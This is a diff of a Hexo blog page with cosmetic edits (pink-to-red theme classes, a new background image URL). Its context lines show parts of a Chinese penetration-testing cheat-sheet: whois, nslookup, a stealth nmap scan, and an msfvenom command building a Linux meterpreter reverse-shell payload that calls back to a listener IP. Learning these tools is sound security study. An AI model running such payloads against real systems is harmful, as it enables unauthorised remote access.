@@ -41,7 +41,7 @@
 color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="../../js/canvas-nest.min.js"></script>
  
   
-<body style="background: url(../../images/back.jpg); background-repeat: no-repeat;
+<body style="background: url(http://p4gdp8beq.bkt.clouddn.com/back1.png); background-repeat: no-repeat;
   background-size: 100% 100%;">
 
   
@@ -398,7 +398,7 @@ window.onload = function()
 
 
             </div>
-            <time class="pink-link-context" datetime="2018-04-28T13:19:00.000Z"><a href="/posts/9e35f352.html">2018-04-28</a></time>
+            <time class="red-link-context" datetime="2018-04-28T13:19:00.000Z"><a href="/posts/9e35f352.html">2018-04-28</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -415,12 +415,12 @@ window.onload = function()
     </div>
 
 
-            <div class="toc pink-link-context hide-on-med-and-down">
+            <div class="toc red-link-context hide-on-med-and-down">
     <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#信息收集"><span class="section table-of-contents-text">信息收集</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#漏洞扫描"><span class="section table-of-contents-text">漏洞扫描</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#渗透攻击"><span class="section table-of-contents-text">渗透攻击</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#meterpreter"><span class="section table-of-contents-text">meterpreter</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#msfvenom"><span class="section table-of-contents-text">msfvenom</span></a></li></ol>
 </div>
 
 
-            <div class="entry pink-link-context">
+            <div class="entry red-link-context">
                 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>1域名、dns信息收集<br>1)whois查询<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whois 域名|ip</span><br></pre></td></tr></table></figure></p>
 <p>2)nslookup<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup 域名</span><br></pre></td></tr></table></figure></p>
 <p>2.nmap<br>1)隐秘的tcp扫描和不ping。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -Pn ip</span><br></pre></td></tr></table></figure></p>
@@ -496,7 +496,7 @@ window.onload = function()
 <p>3)linux<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.230  LPORT=4441 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p>
 
                 
-<p class="pink-link-context">
+<p class="red-link-context">
     <a href="/posts/9cda70be.html" rel="next" title="namp工具的细究">
     Prev: namp工具的细究
   </a>
@@ -504,7 +504,7 @@ window.onload = function()
 
 
 
-<p class="pink-link-context">
+<p class="red-link-context">
     <a href="/posts/11dc13a6.html" rel="next" title="三秒钟的记忆">
     Next: 三秒钟的记忆
   </a>
@@ -730,7 +730,7 @@ var visitor = true;
     </div>
     
 
-    <div class="footer-copyright pink-link-context">
+    <div class="footer-copyright red-link-context">
         <div class="container">
             © 2016 example.com, All rights reserved.
             <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
@@ -906,7 +906,7 @@ var visitor = true;
                             if (isMatch) {
                                 keywords.forEach(function(keyword) {
                                     var regS = new RegExp(keyword, "gi");
-                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
                                 });
 
                                 str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
@@ -928,7 +928,7 @@ var visitor = true;
                                     // highlight all keywords
                                     keywords.forEach(function(keyword) {
                                         var regS = new RegExp(keyword, "gi");
-                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
                                     });
 
                                     str += "<p class=\"search-result\">..." + match_content + "...</p>"
